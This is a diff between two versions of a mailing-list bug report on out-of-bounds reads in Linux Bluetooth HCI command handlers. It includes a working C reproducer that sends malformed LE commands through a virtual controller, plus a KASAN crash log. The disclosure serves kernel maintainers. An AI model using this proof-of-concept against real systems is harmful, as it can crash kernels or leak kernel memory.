@@ -1,47 +1,48 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=45.254.49.197
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=45.254.49.198
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793174636;
-	b=xvPSV0WHG825RUmNEvq0HWmxUNtzEkXiTnD6Zz5wH8Nej0GDBZEW/ReMt3tYebYEG05A
-	 f8ZtgoYv/Wbl7N75HGDED6ZqNqrZG0Jhkm+hKZ+zmFV+pwGoPzcIt/T4J1lcZlXrQ9PBo
-	 Ok9/U8Om+9cqceO6A1tcNaAbXBEuCRdy0MAD/dZ+q1XPtOT/uwyigjr9giT/WHxOtu0Sz
-	 jOyMdJvo7P/cjlsdbeWQ/pYyKtoAVl2IHwSsM8B1FOxi97LODH88x7avhxG5OUDBL57pp
-	 YjmLdMRDC+so0ajqxNR4Lz0c69Yasi6ihenS/4NnUdh3N4lMvkIyAZ/Bsm6t/nneInA==
+	t=1793174640;
+	b=y0qfQm80tE6jZ/wOwP2V2hP0u9rKjZf/x5gENVe5fK6rpDqXWXXrjh4C17u80e+XdwnB
+	 v9smyQEPFq3bAmS8ldUayiz1yfmQW3fd9ndCrsRx5UCzLBDlMSTdZOO8RhD9FFNWRjIWg
+	 LUGceqjdXXt0FjJaYR0uFskVmI+NpmaaBhJNAqYyMRVqS5Bf2OjWIdBx+BMyluxQQkIlf
+	 YaZAeOK+TLEkjeKGwkSNE0g7YM8i+cxH2eIlk68rkQOJHQB/GKoy0vYbV3aAkbhqT+Lvy
+	 iON27hMZAUI5JKrEVIl2f/aMppDXSRUdPcZhRcows5IptapOfSwJfx8yChsoPQ5OspQ==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793174636;
+	a=rsa-sha256; c=relaxed/relaxed; t=1793174640;
 	h=DMARC-Filter:Received:From:Date:Message-ID:To:Cc:Subject:
 	 MIME-Version:Content-Type:X-HM-Tid:X-HM-MType:X-HM-Spam-Status:
 	 DKIM-Signature;
-	bh=wn14wELWgMCYx7ixDTHTearrsDRJ001nA5mNJs84zTc=;
-	b=LUm8ltIe1YKPvdrzPINC9h4hQlyUrzNkCp6+K4ABceQUINE5YCCwR5xnmbCcFZBeSL8S
-	 PFV8deDsI83cGg6o8CB0XDTQzDdlp8h3hAm0fqtdCEoFwG4tgFCGf/Ug+YGF/fArNgzdp
-	 t+vFKwL9NkrXME8XxKZLQvUCpo7niTPOGR4uC2UMpKzRD9hhnMep3pFTzq35IZtHtoD4h
-	 BE4NMbrYoUd6wxQRyhrmt4Tpmh7nmau4mHsCEhaeA0aebK36c2fdx2nn09ACzPh5EYuxD
-	 esYtheeklMHLdtwcrarFgIl+HpHKgpYltkZO+Rlawv96SpRdpy8WilT9YXuZqU3Dbng==
+	bh=pas6f4OMrypSy271E9JjMjmbfSyPWdc+RdUKYUP/TMQ=;
+	b=hKa3uKizckZs4yHm+8bClxAyh98R4w3QR7AddLQL2tPZ7kBtud3GEQ+clv89mSoJJeBE
+	 FWxlRgtfEtXC51PxBQDkIVl4a0ZDzY2j+Bq8OYLoCtodhGJrUHYWOfeypmiIVvu2ouWNT
+	 u/+DowVZ0MPl7vEErsl375GUVTfqtwvdWMPAujFfXPr9CqKbMeteFj2yrvfLaZpH0Qvog
+	 4c9JnVviQjgYQPymsn66LOdfpdmGHE5Jtg3cMX8M6J7Q5pDdDMMNL8Td3tLv7y9D1lq5f
+	 DcvykqZdahLjNybr0C4Gl4zZoXnHl7SrXlaJLu4mdJ8Nk87c39/uavVr+KnxBqWmkhw==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=stu.pku.edu.cn;
 	spf=pass smtp.mailfrom=stu.pku.edu.cn;
-	dkim=pass header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=KAFVwoU3;
-	arc=none smtp.remote-ip=45.254.49.197
-Received: from mail-m49197.qiye.163.com (mail-m49197.qiye.163.com [45.254.49.197])
+	dkim=pass header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=hgKxzc2x;
+	arc=none smtp.remote-ip=45.254.49.198
+Received: from mail-m49198.qiye.163.com (mail-m49198.qiye.163.com [45.254.49.198])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A2F9F606A31E
-	for <linux-bluetooth@vger.kernel.org>; Wed, 28 Oct 2026 08:03:53 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org A2F9F606A31E
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 20B7B606A322
+	for <linux-bluetooth@vger.kernel.org>; Wed, 28 Oct 2026 08:03:57 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 20B7B606A322
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=stu.pku.edu.cn
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=stu.pku.edu.cn
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key, unprotected) header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=KAFVwoU3
+	dkim=pass (1024-bit key, unprotected) header.d=stu.pku.edu.cn header.i=@stu.pku.edu.cn header.a=rsa-sha256 header.s=default header.b=hgKxzc2x
 Received: from 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa (unknown [61.37.18.60])
-	by smtp.qiye.163.com (Hmail) with ESMTP id 52a2336c3;
-	Wed, 28 Oct 2026 16:03:48 +0800 (GMT+08:00)
+	by smtp.qiye.163.com (Hmail) with ESMTP id 52a2336c8;
+	Wed, 28 Oct 2026 16:03:53 +0800 (GMT+08:00)
 From: Yifan Zhang <yfzhang23@stu.pku.edu.cn>
-Date: Wed, 28 Oct 2026 16:03:46 +0800
-Message-ID: <179317462624.87574.6271582002629080499@stu.pku.edu.cn>
+Date: Wed, 28 Oct 2026 16:03:51 +0800
+Message-ID: <179317463153.87610.8996555110609321376@stu.pku.edu.cn>
 To: linux-bluetooth@vger.kernel.org
 Cc: marcel@holtmann.org, luiz.dentz@gmail.com
-Subject: [BUG] Bluetooth: hci_cs_le_create_cis trusts short retained command
+Subject:
+ [BUG] Bluetooth: hci_cc_le_set_cig_params trusts short retained command
 X-Mailing-List: linux-bluetooth@vger.kernel.org
 List-Id: <linux-bluetooth.vger.kernel.org>
 List-Post: <mailto:linux-bluetooth@vger.kernel.org>
@@ -51,51 +52,48 @@ List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-bluetooth+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============7278349626935829163=="
-X-HM-Tid: 0aa18189677a03a2kunmbb5b625f1c1628
+Content-Type: multipart/mixed; boundary="===============5827465301887654440=="
+X-HM-Tid: 0aa181897b5203a2kunmb92f54f11c1634
 X-HM-MType: 10
 X-HM-Spam-Status: e1kfGhgUHx5ZQUtXWQgPGg8OCBgUHx5ZQUlOS1dZFg8aDwILHllBWSg2Ly
-	tZV1koWUFITzdXWRgWCB1ZQUpXWS1ZQUlXWQ8JGhUIEh9ZQVkaQ0pLVhlIQxgdTR9CTUhKTVYeHw
+	tZV1koWUFITzdXWRgWCB1ZQUpXWS1ZQUlXWQ8JGhUIEh9ZQVlDShlPVh9PS01PTEtLSR4fTlYeHw
 	5VEwETFhoSFyQUDg9ZV1kYEgtZQVlNSlVITFVKQ1VNS1lXWRYaDxIVHRRZQVlLVUtVS1VLWQY+
 DKIM-Signature: a=rsa-sha256;
-	b=KAFVwoU3syMT/ZVeKrt7aFrO/d2PPHOW3uckIkcXC+mp9OiX9cVIYyVL3JP0+ojmuDPo0eP87Si5lbxqeiQWd5vuAwU2NcBiqk06LdowWYHBcMrrqI+TlhPAGcpHCo42d69+i9epUVnO+9PAHx5IpDJCrsp7bF072HvHo+WqZ4E=; c=relaxed/relaxed; s=default; d=stu.pku.edu.cn; v=1;
-	bh=wn14wELWgMCYx7ixDTHTearrsDRJ001nA5mNJs84zTc=;
+	b=hgKxzc2xd+Y9S981S+8inAvheholISP7Yamxont6CpPR/m0rK/vgGa89H1UiJDFVg+N3zDWNytJTQgUlT2BJwPBOpxzsbQdpU/eSOGsUrJQTh7eV1bP5WARlNVu/DGaer9mYHKubKppMpKOTRvkbnE24Jno3wOBthDA8r0pgSq0=; c=relaxed/relaxed; s=default; d=stu.pku.edu.cn; v=1;
+	bh=pas6f4OMrypSy271E9JjMjmbfSyPWdc+RdUKYUP/TMQ=;
 	h=date:mime-version:subject:message-id:from;
 
---===============7278349626935829163==
+--===============5827465301887654440==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 7bit
 
 Hello,
 
-I found an out-of-bounds read in hci_cs_le_create_cis() when a retained
-HCI_OP_LE_CREATE_CIS command contains a large num_cis but no trailing CIS
-array. I reproduced it on two fresh boots of an unmodified Linux v7.3 KASAN
-kernel. Both runs reported:
+I found an out-of-bounds read in hci_cc_le_set_cig_params() when a retained
+HCI_OP_LE_SET_CIG_PARAMS command has a large num_cis but no trailing CIS
+parameter array. I reproduced it on two fresh boots of an unmodified Linux
+v7.3 KASAN kernel. The first report in each run was:
 
-  BUG: KASAN: slab-out-of-bounds in hci_cs_le_create_cis+0x3f7/0x440
-  Read of size 2
-  hci_cs_le_create_cis
-  hci_cmd_status_evt
+  BUG: KASAN: slab-out-of-bounds in hci_cc_le_set_cig_params+0x8ae/0xa10
+  Read of size 1
+  hci_cc_le_set_cig_params
+  hci_cmd_complete_evt
   hci_event_packet
   hci_rx_work
 
-The reproducer sends this five-byte HCI RAW packet:
-
-  01 64 20 01 ff
-
-The parameter length is one byte and that byte is present, but num_cis is 255
-and no struct hci_cis elements follow. A valid nonzero Command Status then
-selects the failure cleanup path.
+The command contains the complete 15-byte fixed header, sets num_cis to 124,
+and contains no struct hci_cis_params elements. The VHCI side returns a
+successful Command Complete response with all 124 two-byte handles, so the
+response-side length validation passes.
 
 hci_sent_cmd_data() returns the retained command-parameter pointer without
-its available length. hci_cs_le_create_cis() trusts cp->num_cis and loops over
-cp->cis[i].cis_handle without checking struct_size(cp, cis, cp->num_cis)
-against the command skb. KASAN shows the read leaving the command skb's
-704-byte skbuff_small_head allocation.
+its available length. hci_cc_le_set_cig_params() validates the response array
+and compares its count with cp->num_cis, but never validates the retained
+command's cp->cis[] extent. It then reads cp->cis[i].cis_id. KASAN shows the
+read leaving the command skb's 704-byte skbuff_small_head allocation.
 
-The attached reproducer creates a VHCI controller and sends the malformed
-command through a normal HCI RAW socket:
+The attached reproducer creates a VHCI controller and uses a normal HCI RAW
+socket:
 
   cc -O2 -pthread repro.c -o repro
   ./repro
@@ -103,23 +101,23 @@ command through a normal HCI RAW socket:
 The reproducer requires CAP_NET_RAW and access to /dev/vhci. Both runs used
 fresh copies of the default syzkaller image.
 
-CVE-2026-63944 concerns hci_conn lifetime, and the hci_sent_cmd_data syzbot
-report concerns command-skb lifetime. CVE-2026-98461 validates incoming event
-lengths rather than the retained outgoing command.
+CVE-2026-80763 fixed validation of a truncated controller response. Here the
+response is complete; the out-of-bounds access comes from the retained host
+command.
 
-The handler needs the retained parameter length and must reject the command
-unless the fixed header and complete cp->cis[] array fit. A length-aware
-replacement for hci_sent_cmd_data() would let variable-length command
-consumers perform this check.
+The handler needs the retained parameter length and must require both the
+fixed header and struct_size(cp, cis, cp->num_cis) to fit before indexing
+cp->cis[]. A length-returning hci_sent_cmd_data() helper would also address
+the same API-level problem in the LE_CREATE_CIS status handler.
 
 Attached are the reproducer, KASAN report, and kernel config.
 
 Regards,
 Yifan Zhang
 
---===============7278349626935829163==
+--===============5827465301887654440==
 Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="repro.c"
 MIME-Version: 1.0
 
@@ -155,7 +153,7 @@ MIME-Version: 1.0
 #define HCI_OP_WRITE_SCAN_ENABLE 0x0c1a
 #define HCI_OP_READ_BUFFER_SIZE 0x1005
 #define HCI_OP_READ_BD_ADDR 0x1009
-#define HCI_OP_LE_CREATE_CIS 0x2064
+#define HCI_OP_LE_SET_CIG_PARAMS 0x2062
 
 #define HCIDEVUP _IOW('H', 201, int)
 #define HCISETSCAN _IOW('H', 221, int)
@@ -200,7 +198,7 @@ struct hci_rp_read_bd_addr {
 	uint8_t bdaddr[6];
 } __attribute__((packed));
 
-static int vhci_fd = -1;
+static int vhci_fd =3D -1;
 
 static void die(const char *what)
 {
@@ -210,22 +208,22 @@ static void die(const char *what)
 
 static void write_fullv(int fd, struct iovec *iov, int iovcnt)
 {
-	ssize_t expected = 0;
-	for (int i = 0; i < iovcnt; i++)
-		expected += (ssize_t)iov[i].iov_len;
-	if (writev(fd, iov, iovcnt) != expected)
+	ssize_t expected =3D 0;
+	for (int i =3D 0; i < iovcnt; i++)
+		expected +=3D (ssize_t)iov[i].iov_len;
+	if (writev(fd, iov, iovcnt) !=3D expected)
 		die("writev(vhci)");
 }
 
 static void send_cmd_complete(uint16_t opcode, const void *data, size_t len)
 {
-	uint8_t type = HCI_EVENT_PKT;
-	struct hci_event_hdr eh = {
-		.evt = HCI_EV_CMD_COMPLETE,
-		.plen = (uint8_t)(sizeof(struct hci_ev_cmd_complete) + len),
+	uint8_t type =3D HCI_EVENT_PKT;
+	struct hci_event_hdr eh =3D {
+		.evt =3D HCI_EV_CMD_COMPLETE,
+		.plen =3D (uint8_t)(sizeof(struct hci_ev_cmd_complete) + len),
 	};
-	struct hci_ev_cmd_complete cc = { .ncmd = 1, .opcode = opcode };
-	struct iovec iov[] = {
+	struct hci_ev_cmd_complete cc =3D { .ncmd =3D 1, .opcode =3D opcode };
+	struct iovec iov[] =3D {
 		{ &type, sizeof(type) },
 		{ &eh, sizeof(eh) },
 		{ &cc, sizeof(cc) },
@@ -237,27 +235,27 @@ static void send_cmd_complete(uint16_t opcode, const void *data, size_t len)
 static int answer_init_command(const uint8_t *buf, ssize_t len)
 {
 	const struct hci_command_hdr *hdr;
-	uint8_t dummy[0xf9] = {0};
+	uint8_t dummy[0xf9] =3D {0};
 
-	if (len < 1 + (ssize_t)sizeof(*hdr) || buf[0] != HCI_COMMAND_PKT)
+	if (len < 1 + (ssize_t)sizeof(*hdr) || buf[0] !=3D HCI_COMMAND_PKT)
 		return 0;
-	hdr = (const void *)(buf + 1);
+	hdr =3D (const void *)(buf + 1);
 
-	if (hdr->opcode == HCI_OP_READ_BD_ADDR) {
-		struct hci_rp_read_bd_addr rp = {0};
+	if (hdr->opcode =3D=3D HCI_OP_READ_BD_ADDR) {
+		struct hci_rp_read_bd_addr rp =3D {0};
 		memset(rp.bdaddr, 0xaa, sizeof(rp.bdaddr));
 		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
-	} else if (hdr->opcode == HCI_OP_READ_BUFFER_SIZE) {
-		struct hci_rp_read_buffer_size rp = {
-			.status = 0, .acl_mtu = 1021, .sco_mtu = 96,
-			.acl_max_pkt = 4, .sco_max_pkt = 6,
+	} else if (hdr->opcode =3D=3D HCI_OP_READ_BUFFER_SIZE) {
+		struct hci_rp_read_buffer_size rp =3D {
+			.status =3D 0, .acl_mtu =3D 1021, .sco_mtu =3D 96,
+			.acl_max_pkt =3D 4, .sco_max_pkt =3D 6,
 		};
 		send_cmd_complete(hdr->opcode, &rp, sizeof(rp));
 	} else {
 		send_cmd_complete(hdr->opcode, dummy, sizeof(dummy));
 	}
 
-	return hdr->opcode == HCI_OP_WRITE_SCAN_ENABLE;
+	return hdr->opcode =3D=3D HCI_OP_WRITE_SCAN_ENABLE;
 }
 
 static void *controller_thread(void *unused)
@@ -266,9 +264,9 @@ static void *controller_thread(void *unused)
 	(void)unused;
 
 	for (;;) {
-		ssize_t n = read(vhci_fd, buf, sizeof(buf));
+		ssize_t n =3D read(vhci_fd, buf, sizeof(buf));
 		if (n < 0) {
-			if (errno == EINTR)
+			if (errno =3D=3D EINTR)
 				continue;
 			die("read(vhci init)");
 		}
@@ -280,47 +278,47 @@ static void *controller_thread(void *unused)
 static int create_and_initialize_vhci(void)
 {
 	int ctl;
-	uint8_t create[] = { HCI_VENDOR_PKT, 0x00 };
+	uint8_t create[] =3D { HCI_VENDOR_PKT, 0x00 };
 	uint8_t reply[4];
 	uint16_t dev_id;
 	pthread_t thread;
 	struct hci_dev_req scan;
 
-	ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
+	ctl =3D socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
 	if (ctl < 0)
 		die("socket(HCI control)");
 
-	vhci_fd = open("/dev/vhci", O_RDWR | O_CLOEXEC);
+	vhci_fd =3D open("/dev/vhci", O_RDWR | O_CLOEXEC);
 	if (vhci_fd < 0)
 		die("open(/dev/vhci)");
-	if (write(vhci_fd, create, sizeof(create)) != sizeof(create))
+	if (write(vhci_fd, create, sizeof(create)) !=3D sizeof(create))
 		die("create vhci");
 
 	/* Some kernels send RESET before the vendor device-id reply. */
-	if (read(vhci_fd, &reply, sizeof(reply)) != sizeof(reply))
+	if (read(vhci_fd, &reply, sizeof(reply)) !=3D sizeof(reply))
 		die("read(vhci reply)");
-	if (reply[0] == HCI_COMMAND_PKT &&
-	    (uint16_t)(reply[1] | (reply[2] << 8)) == HCI_OP_RESET) {
-		uint8_t status = 0;
+	if (reply[0] =3D=3D HCI_COMMAND_PKT &&
+	    (uint16_t)(reply[1] | (reply[2] << 8)) =3D=3D HCI_OP_RESET) {
+		uint8_t status =3D 0;
 		send_cmd_complete(HCI_OP_RESET, &status, sizeof(status));
-		if (read(vhci_fd, &reply, sizeof(reply)) != sizeof(reply))
+		if (read(vhci_fd, &reply, sizeof(reply)) !=3D sizeof(reply))
 			die("read(vhci id reply)");
 	}
-	if (reply[0] != HCI_VENDOR_PKT)
+	if (reply[0] !=3D HCI_VENDOR_PKT)
 		die("unexpected vhci reply");
-	dev_id = (uint16_t)(reply[2] | (reply[3] << 8));
+	dev_id =3D (uint16_t)(reply[2] | (reply[3] << 8));
 
-	if (pthread_create(&thread, NULL, controller_thread, NULL) != 0)
+	if (pthread_create(&thread, NULL, controller_thread, NULL) !=3D 0)
 		die("pthread_create");
-	if (ioctl(ctl, HCIDEVUP, (int)dev_id) < 0 && errno != EALREADY)
+	if (ioctl(ctl, HCIDEVUP, (int)dev_id) < 0 && errno !=3D EALREADY)
 		die("HCIDEVUP");
 
 	memset(&scan, 0, sizeof(scan));
-	scan.dev_id = dev_id;
-	scan.dev_opt = SCAN_PAGE;
+	scan.dev_id =3D dev_id;
+	scan.dev_opt =3D SCAN_PAGE;
 	if (ioctl(ctl, HCISETSCAN, &scan) < 0)
 		die("HCISETSCAN");
-	if (pthread_join(thread, NULL) != 0)
+	if (pthread_join(thread, NULL) !=3D 0)
 		die("pthread_join");
 	close(ctl);
 	return dev_id;
@@ -328,11 +326,11 @@ static int create_and_initialize_vhci(void)
 
 static int open_raw_hci(int dev_id)
 {
-	int fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
-	struct sockaddr_hci addr = {
-		.hci_family = AF_BLUETOOTH,
-		.hci_dev = (unsigned short)dev_id,
-		.hci_channel = HCI_CHANNEL_RAW,
+	int fd =3D socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
+	struct sockaddr_hci addr =3D {
+		.hci_family =3D AF_BLUETOOTH,
+		.hci_dev =3D (unsigned short)dev_id,
+		.hci_channel =3D HCI_CHANNEL_RAW,
 	};
 
 	if (fd < 0)
@@ -342,154 +340,166 @@ static int open_raw_hci(int dev_id)
 	return fd;
 }
 
-static void send_malformed_create_cis(int hci_fd)
+static void send_malformed_set_cig_params(int hci_fd)
 {
-	/* The parameter really contains only num_cis.  num_cis claims that
-	 * 255 four-byte hci_cis entries follow, but the raw socket path does
-	 * not validate either hdr.plen or that flexible-array extent.
+	/* The fixed 15-byte parameter ends with num_cis=3D124 but contains no
+	 * nine-byte hci_cis_params entries.  The HCI socket path validates
+	 * neither this opcode-specific minimum nor the flexible-array extent.
 	 */
-	uint8_t cmd[] = {
+	uint8_t cmd[] =3D {
 		HCI_COMMAND_PKT,
-		(uint8_t)(HCI_OP_LE_CREATE_CIS & 0xff),
-		(uint8_t)(HCI_OP_LE_CREATE_CIS >> 8),
-		1,
-		255,
+		(uint8_t)(HCI_OP_LE_SET_CIG_PARAMS & 0xff),
+		(uint8_t)(HCI_OP_LE_SET_CIG_PARAMS >> 8),
+		15,
+		0x42,                         /* cig_id */
+		0, 0, 0,                      /* c_interval */
+		0, 0, 0,                      /* p_interval */
+		0,                            /* sca */
+		0,                            /* packing */
+		0,                            /* framing */
+		0, 0,                         /* c_latency */
+		0, 0,                         /* p_latency */
+		124,                          /* num_cis; cis[] absent */
 	};
 	uint8_t outgoing[1024];
-	uint8_t status_evt[] = {
-		HCI_EVENT_PKT, HCI_EV_CMD_STATUS, 4,
-		1, 1,
-		(uint8_t)(HCI_OP_LE_CREATE_CIS & 0xff),
-		(uint8_t)(HCI_OP_LE_CREATE_CIS >> 8),
+	struct {
+		uint8_t status;
+		uint8_t cig_id;
+		uint8_t num_handles;
+		uint16_t handles[124];
+	} __attribute__((packed)) rp =3D {
+		.status =3D 0,
+		.cig_id =3D 0x42,
+		.num_handles =3D 124,
 	};
 
-	if (send(hci_fd, cmd, sizeof(cmd), 0) != sizeof(cmd))
+	if (send(hci_fd, cmd, sizeof(cmd), 0) !=3D sizeof(cmd))
 		die("send malformed HCI command");
 	if (read(vhci_fd, outgoing, sizeof(outgoing)) < 0)
 		die("read malformed command from vhci");
-	if (write(vhci_fd, status_evt, sizeof(status_evt)) != sizeof(status_evt))
-		die("inject HCI command status");
+	send_cmd_complete(HCI_OP_LE_SET_CIG_PARAMS, &rp, sizeof(rp));
 }
 
 int main(void)
 {
-	int dev_id = create_and_initialize_vhci();
-	int hci_fd = open_raw_hci(dev_id);
+	int dev_id =3D create_and_initialize_vhci();
+	int hci_fd =3D open_raw_hci(dev_id);
 
-	fprintf(stderr, "vhci hci%d initialized; injecting short LE_CREATE_CIS\n",
+	fprintf(stderr, "vhci hci%d initialized; injecting short LE_SET_CIG_PARAMS\n=
+",
 		dev_id);
-	send_malformed_create_cis(hci_fd);
+	send_malformed_set_cig_params(hci_fd);
 	sleep(2);
 	return 0;
 }
 
---===============7278349626935829163==
+--===============5827465301887654440==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="kasan.txt"
 MIME-Version: 1.0
 
-[   22.516566] BUG: KASAN: slab-out-of-bounds in hci_cs_le_create_cis+0x3f7/0=
-x440
-[   22.517106] Read of size 2 at addr ffff88800e26a9c1 by task kworker/u9:1/95
-[   22.517246]=20
-[   22.517851] CPU: 0 UID: 0 PID: 95 Comm: kworker/u9:1 Not tainted 7.3.0 #8 =
+[   22.835698] BUG: KASAN: slab-out-of-bounds in hci_cc_le_set_cig_params+0x8=
+ae/0xa10
+[   22.836252] Read of size 1 at addr ffff88800d985647 by task kworker/u9:1/94
+[   22.836402]=20
+[   22.837134] CPU: 1 UID: 0 PID: 94 Comm: kworker/u9:1 Not tainted 7.3.0 #8 =
 PREEMPT(lazy)=20
-[   22.517988] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[   22.837278] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   22.518374] Workqueue: hci0 hci_rx_work
-[   22.518667] Call Trace:
-[   22.518749]  <TASK>
-[   22.518854]  dump_stack_lvl+0x7b/0xa0
-[   22.519005]  print_report+0xd0/0x630
-[   22.519093]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[   22.519189]  ? hci_cs_le_create_cis+0x3f7/0x440
-[   22.519267]  kasan_report+0xce/0x100
-[   22.519336]  ? hci_cs_le_create_cis+0x3f7/0x440
-[   22.519429]  hci_cs_le_create_cis+0x3f7/0x440
-[   22.519517]  hci_cmd_status_evt+0x1c7/0x6e0
-[   22.519594]  hci_event_packet+0x4c2/0xbd0
-[   22.519687]  ? __pfx_hci_cmd_status_evt+0x10/0x10
-[   22.519760]  ? __pfx_hci_event_packet+0x10/0x10
-[   22.519843]  ? _raw_spin_lock+0x85/0xe0
-[   22.519917]  ? rt_mutex_adjust_prio_chain+0x1d14/0x1f50
-[   22.519981]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[   22.520062]  ? _raw_read_unlock+0x17/0x40
-[   22.520132]  ? hci_send_to_sock+0x106/0x7c0
-[   22.520202]  hci_rx_work+0x375/0x860
-[   22.520264]  process_one_work+0x755/0x1200
-[   22.520354]  ? __pfx_process_one_work+0x10/0x10
-[   22.520427]  ? __pfx_hci_rx_work+0x10/0x10
-[   22.520488]  worker_thread+0x4d3/0xbc0
-[   22.520571]  ? __pfx_worker_thread+0x10/0x10
-[   22.520638]  kthread+0x2fe/0x400
-[   22.520695]  ? recalc_sigpending+0x18c/0x220
-[   22.520763]  ? __pfx_kthread+0x10/0x10
-[   22.520824]  ret_from_fork+0x3f7/0x680
-[   22.520893]  ? __pfx_ret_from_fork+0x10/0x10
-[   22.520964]  ? __switch_to+0x743/0xf60
-[   22.521047]  ? __pfx_kthread+0x10/0x10
-[   22.521108]  ret_from_fork_asm+0x1a/0x30
-[   22.521225]  </TASK>
-[   22.521307]=20
-[   22.521341] Allocated by task 1:
-[   22.521448]  kasan_save_stack+0x33/0x60
-[   22.521530]  kasan_save_track+0x14/0x30
-[   22.521583]  __kasan_slab_alloc+0x6e/0x70
-[   22.521637]  kmem_cache_alloc_node_noprof+0x154/0x400
-[   22.521717]  kmalloc_reserve+0x125/0x300
-[   22.521784]  __alloc_skb+0x149/0x9f0
-[   22.521849]  alloc_skb_with_frags+0x88/0x610
-[   22.521902]  sock_alloc_send_pskb+0x705/0x8a0
-[   22.521974]  hci_sock_sendmsg+0x162/0x2030
-[   22.522026]  __sys_sendto+0x40c/0x460
-[   22.522101]  __x64_sys_sendto+0xe5/0x1c0
-[   22.522172]  do_syscall_64+0xdd/0x4a0
-[   22.522231]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[   22.522298]=20
-[   22.522355] The buggy address belongs to the object at ffff88800e26a700
-[   22.522355]  which belongs to the cache skbuff_small_head of size 704
-[   22.522438] The buggy address is located 1 bytes to the right of
-[   22.522438]  allocated 704-byte region [ffff88800e26a700, ffff88800e26a9c0)
-[   22.522500]=20
-[   22.522575] The buggy address belongs to the physical page:
-[   22.522986] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
- pfn:0xe268
-[   22.523297] head: order:2 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 p=
+[   22.837677] Workqueue: hci0 hci_rx_work
+[   22.838025] Call Trace:
+[   22.838121]  <TASK>
+[   22.838234]  dump_stack_lvl+0x7b/0xa0
+[   22.838397]  print_report+0xd0/0x630
+[   22.838496]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[   22.838601]  ? hci_cc_le_set_cig_params+0x8ae/0xa10
+[   22.838669]  kasan_report+0xce/0x100
+[   22.838737]  ? hci_cc_le_set_cig_params+0x8ae/0xa10
+[   22.838813]  hci_cc_le_set_cig_params+0x8ae/0xa10
+[   22.838899]  ? __pfx_hci_cc_le_set_cig_params+0x10/0x10
+[   22.838979]  ? __asan_memcpy+0x3c/0x60
+[   22.839065]  hci_cmd_complete_evt+0x2eb/0xa20
+[   22.839149]  hci_event_packet+0x4c2/0xbd0
+[   22.839237]  ? __pfx_hci_cmd_complete_evt+0x10/0x10
+[   22.839306]  ? __pfx_hci_event_packet+0x10/0x10
+[   22.839391]  ? hci_send_to_sock+0x141/0x7c0
+[   22.839484]  ? _raw_read_unlock+0x17/0x40
+[   22.839558]  ? hci_send_to_sock+0x106/0x7c0
+[   22.839626]  hci_rx_work+0x375/0x860
+[   22.839689]  process_one_work+0x755/0x1200
+[   22.839781]  ? __pfx_process_one_work+0x10/0x10
+[   22.839852]  ? __pfx_hci_rx_work+0x10/0x10
+[   22.839913]  worker_thread+0x4d3/0xbc0
+[   22.839996]  ? __pfx_worker_thread+0x10/0x10
+[   22.840061]  kthread+0x2fe/0x400
+[   22.840121]  ? recalc_sigpending+0x18c/0x220
+[   22.840197]  ? __pfx_kthread+0x10/0x10
+[   22.840257]  ret_from_fork+0x3f7/0x680
+[   22.840328]  ? __pfx_ret_from_fork+0x10/0x10
+[   22.840394]  ? __switch_to+0x743/0xf60
+[   22.840475]  ? __pfx_kthread+0x10/0x10
+[   22.840534]  ret_from_fork_asm+0x1a/0x30
+[   22.840647]  </TASK>
+[   22.840731]=20
+[   22.840767] Allocated by task 1:
+[   22.840880]  kasan_save_stack+0x33/0x60
+[   22.840974]  kasan_save_track+0x14/0x30
+[   22.841026]  __kasan_slab_alloc+0x6e/0x70
+[   22.841079]  kmem_cache_alloc_node_noprof+0x154/0x400
+[   22.841161]  kmalloc_reserve+0x125/0x300
+[   22.841236]  __alloc_skb+0x149/0x9f0
